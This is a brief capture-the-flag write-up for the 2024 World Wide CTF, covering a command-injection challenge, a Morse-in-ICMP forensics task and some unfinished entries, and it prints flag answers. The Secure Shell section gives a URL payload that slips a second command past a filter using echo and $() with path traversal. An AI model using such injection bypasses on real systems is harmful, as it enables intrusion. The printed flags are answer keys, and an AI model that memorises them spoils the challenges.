---
title: '2024 World Wide CTF Writeup'
description: '发现有 WAF，但是只过滤了第一段命令，可以搭配 echo 和 $ 进行命令执行'
pubDate: 2024-06-20
author: 'IHK-1'
tags: ['CTF', 'WorldWideCTF', '2024']
---

# begin
## Secure Shell
```plain
https://secureshell.wwctf.com/?cmd=cat
```

发现有 WAF，但是只过滤了第一段命令，可以搭配 echo 和 $() 进行命令执行

```plain
https://secureshell.wwctf.com/?cmd=echo $(../../../../../../readflag)
```

## Simpler RSA

# MISC
## World Wide Flags
```plain

http://flags.chal.wwctf.com:1337/flag
```

## Bongcloud
有点麻烦，暂未写

# Forensics
## Too Hidden
```plain
tshark -r chall.pcapng -T fields -e icmp.checksum > chall.txt
```

```python
lines = open('chall.txt').readlines()
out = ""
for line in lines:
    line = line.strip()
    if len(line):
        if line == "0xc3c9":
            out += "."
        elif line == "0xc3ca":
            out += "-"
        elif line == "0xc4cd":
            out += "/"

print(out)

# .--/.--/..-.//..../---/.-../-.--/..--.-/.../..../././././-/..--.-/-.--/---/..-/..--.-/-.-./.-/-./..--.-/..-./../-./-../..--.-/--/./..--.-/..--../..--../..--../..--../..--../..--../..--../..--../..--../..--../

# WWFHOLY_SHEEEET_YOU_CAN_FIND_ME_??????????
```

## Forgot Password

```plain
wwf{I_love_security_questions_s0_muChhhhhhhhhhhhhhhhh}
```

